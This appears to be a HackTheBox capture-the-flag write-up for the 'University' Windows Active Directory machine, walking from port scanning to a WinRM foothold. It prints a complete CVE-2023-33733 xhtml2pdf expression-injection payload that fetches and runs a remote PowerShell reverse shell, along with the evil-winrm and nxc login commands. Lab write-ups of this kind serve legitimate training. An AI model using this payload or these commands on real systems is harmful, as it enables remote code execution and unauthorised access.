---
title: "University"
date: 2027-01-14 07:00:00 -0500
categories: [HackTheBox, Windows]
tags: [hackthebox, windows, insane, active-directory, xhtml2pdf, cve-2023-33733, rce, password-reuse, winrm]
image:
    path: /assets/Images/university-001_foothold_creds-winrm.png
    alt: University
description: "University is an Insane Windows Active Directory box centred on a remote-learning portal. Exporting a profile to PDF runs the user-controlled Bio field through xhtml2pdf, which is vulnerable to CVE-2023-33733 — a Python expression-injection RCE that lands a shell as the web user. An on-disk database-backup script then leaks a password that, combined with the account's Remote Management membership, gives a WinRM foothold. This post covers recon through the foothold."
---

## Overview

University is an Insane-rated Windows machine fronted by a university e-learning platform on port 80. The site lets any registered user export their profile to a PDF — and that export pipeline is the way in. This post walks recon through the initial WinRM foothold; the deep Active Directory chain to user and root is left as an exercise.

## Recon

A full TCP scan shows a Windows Domain Controller (`university.htb` / `DC.university.htb`) with an Nginx web app on 80.

| Port | Service |
|------|---------|
| 53 | DNS |
| 80 | HTTP (nginx 1.24.0 → `university.htb`) |
| 88 | Kerberos |
| 135/139/445 | MSRPC / NetBIOS / SMB |
| 389/636/3268/3269 | LDAP / LDAPS / Global Catalog |
| 464 | kpasswd |
| 5985 | WinRM |
| 9389 | AD Web Services |

```bash
nmap -p- --min-rate 1000 -T4 10.129.231.193
nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV 10.129.231.193
```

Add the hostnames to `/etc/hosts`:

```bash
echo "10.129.231.193 university.htb DC.university.htb DC" | sudo tee -a /etc/hosts
```

## Enumeration

The web app is a remote-learning platform with **Student** and **Professor** account types. After registering a student account and editing **My Profile**, the page offers a **Profile Export → PDF** option that renders everything you put in your profile — including the free-text **Bio** field.

Pulling the generated PDF through `exiftool` reveals the engine behind it:

```bash
exiftool profile.pdf | grep Producer
# Producer : xhtml2pdf https://github.com/xhtml2pdf/xhtml2pdf/
```

`xhtml2pdf` (which wraps ReportLab) is vulnerable to **CVE-2023-33733**, and the Bio field flows straight into it — an attacker-controlled HTML sink rendered server-side.

## Foothold

### CVE-2023-33733 — xhtml2pdf / ReportLab expression injection

ReportLab evaluates Python expressions embedded in a `<font color="[...]">` attribute during rendering. A crafted color expression breaks out into Python and calls `os.system`. Drop the payload into the Bio field, host a reverse shell, and trigger **Profile Export** to execute it server-side.

```bash
# host the reverse-shell stager
python3 -m http.server 80
```

```html
<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell IEX(IWR http://<lhost>/shell.ps1 -usebasicparsing)') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">exploit</font></para>
```

Exporting the profile triggers the payload and returns a shell as `university\wao`.

![wao shell](/assets/Images/university-001_foothold_creds-winrm.png)

### Password reuse → WinRM

`wao` is a member of **Remote Management Users**, so a valid password means WinRM access. Looking around `C:\Web\`, a database-backup automation script hard-codes the 7-Zip archive password — which is essentially the username with a suffix:

```powershell
# C:\Web\DB Backup\db-backup-automator.ps1
$7zCommand = "& `"$7zExePath`" a `"$zipFilePath`" `"$sourcePath`" -p'<redacted>'"
```

That password authenticates `wao` over WinRM:

```bash
nxc winrm 10.129.231.193 -u WAO -p '<redacted>'      # (Pwn3d!)
evil-winrm -i university.htb -u wao -p '<redacted>'
```

![wao WinRM on DC](/assets/Images/university-003_foothold_dc-winrm-wao.png)

From this shell the DC turns out to be **dual-homed** into an internal `192.168.99.0/24` lab segment — the launchpad for the rest of the chain.

![DC dual-homed](/assets/Images/university-005_foothold_dc-interfaces.png)

## User flag

The `user.txt` on University lives deep in the Active Directory chain (certificate forgery, a SmartScreen-bypass lecture upload, and an unconstrained-delegation relay) reached through this WinRM foothold and the internal network above.

```bash
type C:\Users\<user>\Desktop\user.txt   # HTB{...}
```

Flag value redacted.

> Foothold complete. The full AD path to user and root is left as an exercise — this post stops at the initial shell.
